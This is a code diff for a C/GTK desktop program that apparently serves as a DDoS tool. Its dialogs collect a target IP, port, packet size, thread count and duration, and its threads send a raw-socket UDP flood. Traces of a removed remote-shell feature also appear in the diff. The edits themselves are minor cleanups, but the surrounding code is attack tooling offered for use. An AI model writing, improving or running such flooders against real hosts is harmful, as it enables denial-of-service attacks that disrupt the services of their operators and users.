@@ -37,18 +37,9 @@ static unsigned int floodport;
 
 GtkWidget *main_win;
 
-//const gchar *chemin;
-//GtkWidget *upload_entry;
-
-//const gchar *server_ip;
-//const gchar *server_port;
-//int port;
-
-//SOCKET remote_shell_sock;
-
-//GtkWidget *text_view;
-//GtkWidget *rs_text_view;
 GtkWidget *ddos_text_view;
+
+const gchar *script_command = NULL;
 
 
 
@@ -56,13 +47,15 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
 {
     GtkWidget *run_script_dialog = NULL;
     GtkWidget *script_command_entry = NULL;
-    const gchar *script_command = NULL;
+    //const gchar *script_command = NULL;
     gchar *logs_msg = NULL;
 
     GtkTextBuffer *text_buffer = NULL;
     gchar *text = NULL;
     GtkTextIter start;
     GtkTextIter end;
+
+    size_t i = 0;
 
     logs_msg = malloc(128 * sizeof(char));
     if(logs_msg == NULL)
@@ -86,7 +79,7 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
 
     g_free(text);
 
-    run_script_dialog = gtk_dialog_new_with_buttons("Run UDP Basic Attack 1", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    run_script_dialog = gtk_dialog_new_with_buttons("Run UDP Basic Attack 1", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
 
     gtk_widget_set_size_request(run_script_dialog, 360, 100);
 
@@ -97,6 +90,7 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
     gtk_box_pack_start(GTK_BOX(GTK_DIALOG(run_script_dialog)->vbox), script_command_entry, TRUE, FALSE, 0);
 
     gtk_widget_show_all(GTK_DIALOG(run_script_dialog)->vbox);
+
 
     switch(gtk_dialog_run(GTK_DIALOG(run_script_dialog)))
     {
@@ -117,6 +111,7 @@ void cb_udp_ddos_script_1(GtkButton *button, gpointer user_data)
 
     return;
 }
+
 
 void cb_udp_ddos_script_2(GtkButton *button, gpointer user_data)
 {
@@ -238,7 +233,7 @@ void cb_udp_power_ddos(void)
     throttle_dialog = gtk_dialog_new_with_buttons("Enter Throttle", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     packet_dialog = gtk_dialog_new_with_buttons("Enter Packet Size(max 1024)", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
     threads_dialog = gtk_dialog_new_with_buttons("Enter Threads Number", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
-    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win),  GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
+    time_dialog = gtk_dialog_new_with_buttons("Enter Time", GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_STOCK_APPLY, GTK_RESPONSE_APPLY, NULL);
 
     gtk_widget_set_size_request(IP_dialog, 360, 100);
     gtk_widget_set_size_request(port_dialog, 360, 100);
@@ -378,7 +373,7 @@ void cb_udp_power_ddos(void)
         pthread_create(&thread[i], NULL, &flood_power, (void *) &td[i]);
     }
 
-    fprintf(stdout, "Starting Flood...\n");;
+    fprintf(stdout, "Starting Flood...\n");
 
     wait_time_end(atoi(time_duration));
 
@@ -388,6 +383,8 @@ void cb_udp_power_ddos(void)
     gtk_widget_destroy(packet_dialog);
     gtk_widget_destroy(threads_dialog);
     gtk_widget_destroy(time_dialog);
+
+    printf("Time expired !!! \n");
 
     for(i = 0; i < num_threads; i++)
         pthread_cancel(thread[i]);
@@ -553,7 +550,7 @@ void *flood_power(void *par1)
 
     char *data = (char *)udph + sizeof(struct udphdr);
     data = replStr("\xFF", td->pks);
-    udph->len=htons(td->pks);
+    udph->len = htons(td->pks);
 
     iph->tot_len += td->pks;
 
